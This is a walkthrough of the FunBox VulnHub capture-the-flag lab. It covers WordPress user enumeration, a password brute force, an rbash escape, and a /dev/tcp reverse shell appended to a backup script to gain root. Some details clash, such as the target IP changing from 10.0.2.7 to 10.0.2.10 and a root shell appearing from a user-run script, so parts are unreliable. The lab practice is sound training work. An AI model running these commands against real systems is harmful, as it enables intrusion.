FunBox VulnHub Walkthrough

FunBox is a beginner-friendly vulnerable machine that can be imported and run locally for penetration testing practice.

Download the machine (.ova file) here:
https://download.vulnhub.com/funbox/FunBox.ova

Step 1 — Finding the Target IP
Start by listing all active devices on your network:
sudo arp-scan -l
Look for MAC addresses starting with 08:00:27, which usually belong to VirtualBox machines. The last one in the list, 10.0.2.7, is the FunBox machine.

Step 2 — Reconnaissance
Scan the target machine using Nmap to detect open ports and running services:
nmap -sC -sV -Pn -T4 10.0.2.7
The scan shows the following:
Open ports: ftp(21), ssh(22), http(80)
HTTP site title: FunBox
WordPress version: 5.42
Open the target IP in a browser to explore the website.

Step 3 — Discover Hidden Directories
Run dirsearch to find directories that may contain sensitive information:
dirsearch -u http://10.0.2.7/
This reveals /secret, /robots.txt, and /wp-admin. Checking /secret and /robots.txt reveals nothing useful. The /wp-admin directory is a WordPress login page, which requires credentials.

Step 4 — Enumerate WordPress Users
Use wpscan to enumerate usernames:
wpscan --url http://funbox.fritz.box/ -e u
Two usernames are discovered: admin and joe.

Step 5 — Brute Force WordPress Password
Brute-force Joe’s password using:
wpscan --url http://funbox.fritz.box/-U joe -P /usr/share/wordlists/rockyou.txt
The password is found: 12345.

Step 6 — SSH Access
Use the credentials to log in via SSH:
ssh joe@10.0.2.10
This gives a stable shell, but Joe is in a restricted shell (rbash).

Step 7 — Bypass Restricted Shell
Reconnect to SSH with an unrestricted bash shell:
ssh joe@10.0.2.10 -t "bash --noprofile"

Step 8 — Prepare Reverse Shell
Navigate to /home/funny and find .backup.sh. Add the reverse shell payload:
bash -c 'exec bash -i &>/dev/tcp/10.0.2.4/9999 <&1'
Start a netcat listener on your local machine:
nc -lnvp 9999
Trigger the reverse shell:
bash .backup.sh

Step 9 — Gain Root Access
The reverse shell connects as root. Navigate to /root to retrieve the final flag, stored in the file named flag.

Step 10 — Summary
By following these steps, we were able to:

Identify the target FunBox IP
Perform service enumeration and web reconnaissance
Discover WordPress users and brute-force a password
Obtain SSH access and bypass restricted shell limitations
Execute a reverse shell to gain root privileges and retrieve the final flag
